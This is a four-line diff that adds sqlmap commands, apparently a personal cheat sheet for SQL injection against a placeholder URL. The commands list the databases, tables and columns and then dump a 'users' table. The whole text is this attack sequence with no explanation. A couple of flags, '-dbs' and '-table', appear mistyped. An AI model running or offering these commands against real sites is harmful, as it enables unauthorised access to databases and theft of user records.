@@ -1,0 +1,4 @@
+sqlmap -u "url/" -dbs
+sqlmap -u "url/" -D "db name" -table
+sqlmap -u "url/" -D "db name" -T users --columns
+sqlmap -u "url/" -D "db name" -T users --dump 
